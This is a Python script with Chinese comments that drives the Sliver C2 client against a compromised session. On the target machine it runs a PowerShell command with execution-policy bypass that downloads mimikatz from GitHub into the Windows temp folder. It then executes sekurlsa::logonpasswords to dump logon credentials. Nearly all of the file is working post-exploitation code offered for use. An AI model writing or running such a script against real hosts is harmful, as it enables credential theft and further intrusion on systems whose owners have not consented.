"""
run_mimikatz.py - 在目标会话上执行 Mimikatz
修复：增加超时时间、使用二进制模式避免 GBK 编码问题
"""
import subprocess, tempfile, os, sys, io

# 强制 stdout 使用 utf-8 编码，避免 GBK 无法编码 Unicode 字符
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

session_id = sys.argv[1] if len(sys.argv) > 1 else "03d96202"
mimikatz_cmd = sys.argv[2] if len(sys.argv) > 2 else "sekurlsa::logonpasswords"

rc_file = os.path.join(tempfile.gettempdir(), 'sliver_rc.txt')

def run_sliver_rc(rc_content: str, timeout: int = 300) -> str:
    """执行 Sliver CLI 命令并返回输出（二进制模式，避免编码问题）"""
    with open(rc_file, 'w', encoding='ascii') as f:
        f.write(rc_content)
    
    try:
        result = subprocess.run(
            ['.\\sliver-client.exe', 'console', '--rc', rc_file],
            capture_output=True,
            timeout=timeout,
            cwd='d:\\sliver'
        )
        # 使用二进制模式，先尝试 GBK 再回退 UTF-8
        raw = result.stdout
        try:
            return raw.decode('gbk')
        except UnicodeDecodeError:
            return raw.decode('utf-8', errors='replace')
    except subprocess.TimeoutExpired as e:
        raw = e.stdout or b''
        try:
            return "[TIMEOUT]\n" + raw.decode('gbk')
        except UnicodeDecodeError:
            return "[TIMEOUT]\n" + raw.decode('utf-8', errors='replace')
    finally:
        try:
            os.remove(rc_file)
        except:
            pass


# Step 1: Download mimikatz (if not already downloaded)
print("[*] Step 1: Downloading mimikatz (timeout=300s)...", flush=True)
ps_dl = (
    'powershell -ExecutionPolicy Bypass -Command '
    '"$p=' + "'C:/Windows/Temp/m'" + ';'
    'if(!(Test-Path $p)){'
    '$wc=New-Object Net.WebClient;'
    '$wc.DownloadFile(' + "'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20230905/mimikatz_trunk.zip'," + "'C:/Windows/Temp/m.zip'" + ');'
    'Expand-Archive C:/Windows/Temp/m.zip -DestinationPath $p -Force'
    '}"'
)

rc_content = "use %s\nexecute -o -t 300 -- %s\nexit" % (session_id, ps_dl)
output = run_sliver_rc(rc_content, timeout=300)
print("Step 1 output (last 500 chars):", output[-500:], flush=True)

# Step 2: Execute mimikatz with longer timeout
print("\n[*] Step 2: Executing mimikatz %s (timeout=300s)..." % mimikatz_cmd, flush=True)
ps_exec = (
    'powershell -ExecutionPolicy Bypass -Command '
    '"C:/Windows/Temp/m/x64/mimikatz.exe ' + mimikatz_cmd + ' exit"'
)

rc_content = "use %s\nexecute -o -t 300 -- %s\nexit" % (session_id, ps_exec)
output = run_sliver_rc(rc_content, timeout=300)
print(output, flush=True)
